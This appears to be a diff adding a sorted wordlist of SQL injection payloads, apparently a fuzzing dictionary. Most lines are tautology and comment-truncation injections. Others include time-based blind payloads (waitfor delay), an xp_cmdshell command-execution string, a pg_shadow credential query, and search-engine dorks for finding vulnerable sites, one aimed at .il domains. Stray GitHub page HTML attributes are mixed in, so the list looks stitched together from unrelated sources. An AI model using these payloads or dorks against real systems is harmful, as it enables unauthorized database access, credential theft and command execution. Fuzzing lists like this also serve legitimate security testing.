+data-target="query-builder.styledInput"
+data-target="query-builder.styledInputContent"
+delete
+desc
+distinct
+exec sp
+exec xp
+focus:query-builder#clearButtonFocus
+focus:query-builder#inputFocus
+grant connect to name; grant resource to name;
+handler
+having
+hi or 1=1 --"
+hi or a=a
+hi" or "a"="a
+hi" or 1=1 --
+hi' or 'a'='a
+hi' or 1=1 --
+hidden
+href="/"
+id="custom_scope_name"
+id="custom_scope_query"
+id="query-builder-test-results"
+in****:"ADODB.Command"
+in****:"ADODB.Field"
+in****:"BOF or EOF"
+in****:"Error Occurred While Processing Request"
+in****:"Input string was not in a correct format"
+in****:"InvalidQuerystring"
+in****:"JET Database"
+in****:"Microsoft OLE DB Provider for ODBC Drivers error"
+in****:"OLE DB Provider for ODBC"
+in****:"Server Error in '/' Application"
+in****:"Syntax error"
+in****:"VBScript Runtime"
+input:query-builder#inputChange
+insert
+intext:"error in your SQL syntax"
+inurl:/id= intext:"You have an error in your SQL syntax"
+inurl:zoom.php?id=site:.il
+keydown:query-builder#inputKeydown
+lang="en"
+like
+limit
+maxlength="50">
+maxlength="500">
+mousedown:query-builder#resultsMousedown
+n.&1c: select * from users where id=1 +$ . or 1=1 -- 1
+n1&1c: select * from users where id=1 +$ 1 or 1=1 -- 1
+name="custom_scope_name"
+name="custom_scope_query"
+no&1c: select * from users where id=1 +$+ or 1=1 -- 1
+no.&1: select * from users where id=1 +$+. or 1=1 -- 1
+o&1c: select * from users where id=1 <@ or 1=1 -- 1
+o.&1c: select * from users where id=1 <@. or 1=1 -- 1
+o..&1: select * from users where id=1 <@.. or 1=1 -- 1
+o.n&1: select * from users where id=1 <@.$ or 1=1 -- 1
+o1&1c: select * from users where id=1 *1 or 1=1 -- 1
+o1n&1: select * from users where id=1 <@1$ or 1=1 -- 1
+on&1c: select * from users where id=1 <@$ or 1=1 -- 1
+onn&1: select * from users where id=1 <@$_ or 1=1 -- 1
+oo&1c: select * from users where id=1 <@<@ or 1=1 -- 1
+or
+or 0=0 #
+or 0=0 #"
+or 0=0 --
+or 0=0 –
+or 1=1
+or 1=1 or ""=
+or 1=1#
+or 1=1--
+or 1=1/*
+or 1=1–
+or 2=2
+or a = a
+or a=a
+or true
+or true--
+order by
+order by 1--
+ov&1c: select * from users where id=1 &@ or 1=1 -- 1
+partial-name="appearance-settings"
+partial-name="keyboard-shortcuts-dialog"
+partial-name="marketing-navigation"
+password:*/=1--
+placeholder="Search or jump to..."
+placeholder="github-ruby"
+procedure
+replace
+required
+role="listbox"
+s&.o&: select * from users where id='1' or \.<\ or 1=1 -- 1'
+s&1c: select * from users where id='1'   or 1=1 -- 1'
+s&n1&: select * from users where id='1' or $ 1=1 or 1=1 -- 1'
+s&no&: select * from users where id='1' or $<\ or 1=1 -- 1'
+s&o.&: select * from users where id='1' or \<\. or 1=1 -- 1'
+s&o1&: select * from users where id='1' or \<1 or 1=1 -- 1'
+s&on&: select * from users where id='1' or \<$ or 1=1 -- 1'
+s).s: select * from users where id=1 or ")."=1 or 1=1 -- 1
+s)1s: select * from users where id=1 or ")1" or 1=1 -- 1
+s):s: select * from users where id=1 or "):" or 1=1 -- 1
+s);s: select * from users where id=1 or ");" or 1=1 -- 1
+s)?s: select * from users where id=1 or ")]" or 1=1 -- 1
+s)n: select * from users where id=1 or ")[" or 1=1 -- 1
+s)ns: select * from users where id=1 or ")$" or 1=1 -- 1
+s)v: select * from users where id=1 or ")@" or 1=1 -- 1
+s){s: select * from users where id=1 or "){" or 1=1 -- 1
+s.)s: select * from users where id=1 or ".)" or 1=1 -- 1
+s..s: select * from users where id=1 or ".."=1 or 1=1 -- 1
+s.:s: select * from users where id=1 or ".:"=1 or 1=1 -- 1
+s.;s: select * from users where id=1 or ".;" or 1=1 -- 1
+s.?s: select * from users where id=1 or ".]" or 1=1 -- 1
+s.c: select * from users where id=1 or ".#" or 1=1 -- 1
+s.n: select * from users where id=1 or ".[" or 1=1 -- 1
+s.ns: select * from users where id=1 or "._" or 1=1 -- 1
+s.o1&: select * from users where id=1 or @#".=1 or 1=1 -- 1
+s.v: select * from users where id=1 or ".@" or 1=1 -- 1
+s.{s: select * from users where id=1 or ".{" or 1=1 -- 1
+s1)s: select * from users where id=1 or "1)" or 1=1 -- 1
+s1:s: select * from users where id=1 or "1:" or 1=1 -- 1
+s1;s: select * from users where id=1 or "1;"=1 or 1=1 -- 1
+s1?s: select * from users where id=1 or "1]" or 1=1 -- 1
+s1c: select * from users where id=1 or "1#" or 1=1 -- 1
+s1n: select * from users where id=1 or "1[" or 1=1 -- 1
+s1ns: select * from users where id=1 or "1_" or 1=1 -- 1
+s1os: select * from users where id=1 or "1&" or 1=1 -- 1
+s1{s: select * from users where id=1 or "1{" or 1=1 -- 1
+s:&1c: select * from users where id=1 or 1#": or 1=1 -- 1
+s:)s: select * from users where id=1 or ":)"=1 or 1=1 -- 1
+s:.s: select * from users where id=1 or ":."=1 or 1=1 -- 1
+s:1s: select * from users where id=1 or ":1" or 1=1 -- 1
+s:;s: select * from users where id=1 or ":;"=1 or 1=1 -- 1
+s:?s: select * from users where id=1 or ":]" or 1=1 -- 1
+s:c: select * from users where id=1 or ":#" or 1=1 -- 1
+s:n: select * from users where id=1 or ":[" or 1=1 -- 1
+s:ns: select * from users where id=1 or ":$" or 1=1 -- 1
+s:v: select * from users where id=1 or ":@" or 1=1 -- 1
+s:{s: select * from users where id=1 or ":{" or 1=1 -- 1
+s;&1c: select * from users where id=1 or 1#"; or 1=1 -- 1
+s;)s: select * from users where id=1 or ";)"=1 or 1=1 -- 1
+s;.s: select * from users where id=1 or ";."=1 or 1=1 -- 1
+s;1s: select * from users where id=1 or ";1" or 1=1 -- 1
+s;:s: select * from users where id=1 or ";:"=1 or 1=1 -- 1
+s;?s: select * from users where id=1 or ";]" or 1=1 -- 1
+s;c: select * from users where id=1 or ";#" or 1=1 -- 1
+s;n: select * from users where id=1 or ";[" or 1=1 -- 1
+s;ns: select * from users where id=1 or ";_" or 1=1 -- 1
+s;o1&: select * from users where id=1 or @#";=1 or 1=1 -- 1
+s;os: select * from users where id=1 or ";&" or 1=1 -- 1
+s;v: select * from users where id=1 or ";@" or 1=1 -- 1
+s;{s: select * from users where id=1 or ";{" or 1=1 -- 1
+s?&1c: select * from users where id=1 or 1#"? or 1=1 -- 1
+s?)s: select * from users where id=1 or "])" or 1=1 -- 1
+s?.s: select * from users where id=1 or "]." or 1=1 -- 1
+s?1s: select * from users where id=1 or "]1" or 1=1 -- 1
+s?:s: select * from users where id=1 or "]:" or 1=1 -- 1
+s?;s: select * from users where id=1 or "?;" or 1=1 -- 1
+s??s: select * from users where id=1 or "??" or 1=1 -- 1
+s?c: select * from users where id=1 or "?#" or 1=1 -- 1
+s?n: select * from users where id=1 or "?[" or 1=1 -- 1
+s?ns: select * from users where id=1 or "?_" or 1=1 -- 1
+s?o1&: select * from users where id=1 or 1#"?=1 or 1=1 -- 1
+s?v: select * from users where id=1 or "?@" or 1=1 -- 1
+s?{s: select * from users where id=1 or "]{" or 1=1 -- 1
+s\c: select * from users where id=1 or "\#" or 1=1 -- 1
+select
+select * from myfile;copy myfile to /tmp/test;
+select * from pg_group;
+select * from pg_shadow;
+select current_user;
+select session_user;
+sn)s: select * from users where id=1 or "_)" or 1=1 -- 1
+sn:s: select * from users where id=1 or "$:" or 1=1 -- 1
+sn;s: select * from users where id=1 or "_;" or 1=1 -- 1
+sn?s: select * from users where id=1 or "$?" or 1=1 -- 1
+snc: select * from users where id=1 or "$#" or 1=1 -- 1
+snn: select * from users where id=1 or "$[" or 1=1 -- 1
+snns: select * from users where id=1 or "$_" or 1=1 -- 1
+snos: select * from users where id=1 or "$&" or 1=1 -- 1
+snv: select * from users where id=1 or "$@" or 1=1 -- 1
+sn{s: select * from users where id=1 or "_{" or 1=1 -- 1
+so)s: select * from users where id=1 or "&)" or 1=1 -- 1
+so..&: select * from users where id='1'<@.. or 1=1 -- 1'
+so.n&: select * from users where id='1' <@.$ or 1=1 -- 1'
+so:s: select * from users where id=1 or "&:" or 1=1 -- 1
+son.&: select * from users where id='1' *$ . or 1=1 -- 1'
+son1&: select * from users where id='1' *$ 1 or 1=1 -- 1'
+sonn&: select * from users where id='1' <@$_ or 1=1 -- 1'
+soo1&: select * from users where id='1' <@&1 or 1=1 -- 1'
+soov&: select * from users where id='1' <@&@ or 1=1 -- 1'
+sqlvuln;
+style="border-radius: 12px;"
+style="margin-left: 12px;"
+sv)s: select * from users where id=1 or "@)" or 1=1 -- 1
+sv:s: select * from users where id=1 or "@:"=1 or 1=1 -- 1
+sv;s: select * from users where id=1 or "@;"=1 or 1=1 -- 1
+sv?s: select * from users where id=1 or "@?" or 1=1 -- 1
+svc: select * from users where id=1 or "@#" or 1=1 -- 1
+s{)s: select * from users where id=1 or "{)" or 1=1 -- 1
+s{.s: select * from users where id=1 or "{." or 1=1 -- 1
+s{1s: select * from users where id=1 or "{1"=1 or 1=1 -- 1
+s{:s: select * from users where id=1 or "{:" or 1=1 -- 1
+s{;s: select * from users where id=1 or "{;" or 1=1 -- 1
+s{?s: select * from users where id=1 or "{?" or 1=1 -- 1
+s{c: select * from users where id=1 or "{#" or 1=1 -- 1
+s{o1&: select * from users where id=1 or @#"{=1 or 1=1 -- 1
+s{v: select * from users where id=1 or "{@" or 1=1 -- 1
+s{{s: select * from users where id=1 or "{{" or 1=1 -- 1
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+tabindex="-1"
+to_timestamp_tz
+truncate
+type="button"
+type="text"
+tz_offset
+uni/**/on sel/**/ect
+update
+waitfor delay '00:00:05'
+waitfor delay '00:00:05'#
+waitfor delay '00:00:05'--
+waitfor delay '0:0:20' --
+waitfor delay '0:0:20' /*
+waitfor delay '0:0:__TIME__' --
+waitfor delay '0:0:__TIME__' /*
+x' AND email IS NULL; --
+x' AND members.email IS NULL; --
+x' AND userid IS NULL; --
+x' and email is NULL; --
+x' and members.email is NULL; --
+x' and userid is NULL; --
+x' or 1=1 or 'x'='y
+|
+||6
+}
+‘ or 1=1 --
+‘ or 3=3 --
+’ or ‘1’=’1
